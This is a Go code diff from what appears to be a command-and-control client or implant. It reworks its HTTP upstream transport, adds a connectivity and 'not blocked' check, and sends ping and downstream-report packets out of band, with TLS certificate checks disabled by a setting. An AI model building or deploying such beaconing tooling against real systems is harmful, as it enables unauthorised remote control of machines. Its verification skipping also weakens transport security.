@@ -25,13 +25,13 @@ type Client struct {
 func NewClient() Client {
 	config := MakeClientConfig()
 	campaign := model.MakeCampaign()
-	upstream := MakeUpstream(&config, &campaign)
+	upstream := MakeUpstreamHttp(&config, &campaign)
 	downstreamManager := MakeDownstreamManager()
 
 	w := Client{
 		&config,
 		&campaign,
-		upstream,
+		&upstream,
 		downstreamManager,
 	}
 	return w
@@ -44,9 +44,12 @@ func (s *Client) Start() {
 		http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 	}
 
-	s.DownstreamManager.StartListeners(s)
-	go s.Upstream.Start() // Thread: Upstream
-	go s.sendPing()       // Thread: sendPing
+	// "Connect" to the server, mostly to check if we have internet connection and are not blocked
+	s.Upstream.Connect()
+	go s.Upstream.Start()
+
+	//s.DownstreamManager.StartListeners(s) // FIXME make optional
+	go s.sendPing() // Thread: sendPing
 
 	var p model.Packet
 	for {
@@ -75,7 +78,7 @@ func (s *Client) sendPing() {
 
 	packet := model.NewPacket("ping", s.Config.ComputerId, "0", arguments, response)
 	for {
-		err := s.Upstream.SendPacket(packet)
+		err := s.Upstream.SendOutofband(packet)
 		if err == nil {
 			break // when no error -> success
 		}
@@ -96,7 +99,7 @@ func (s *Client) SendDownstreams(downstreams []DownstreamInfo) error {
 
 	packet := model.NewPacket("downstreams", s.Config.ComputerId, strconv.Itoa(int(rand.Uint64())), arguments, response)
 
-	err := s.Upstream.SendPacket(packet)
+	err := s.Upstream.SendOutofband(packet)
 	if err != nil {
 		return err
 	}
